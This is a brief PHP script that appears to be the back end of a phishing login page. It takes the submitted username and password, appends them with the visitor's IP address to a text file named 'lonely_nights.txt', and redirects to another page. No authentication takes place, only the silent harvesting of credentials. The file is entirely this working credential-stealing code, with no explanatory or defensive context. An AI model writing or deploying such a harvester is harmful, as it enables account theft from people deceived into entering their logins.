<?php

$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];

$file = fopen("lonely_nights.txt", "a") or die("Unable to open file!");

$string = "$username:$password:$ip\n";

fwrite($file, $string);

header("Location: code.php");
?>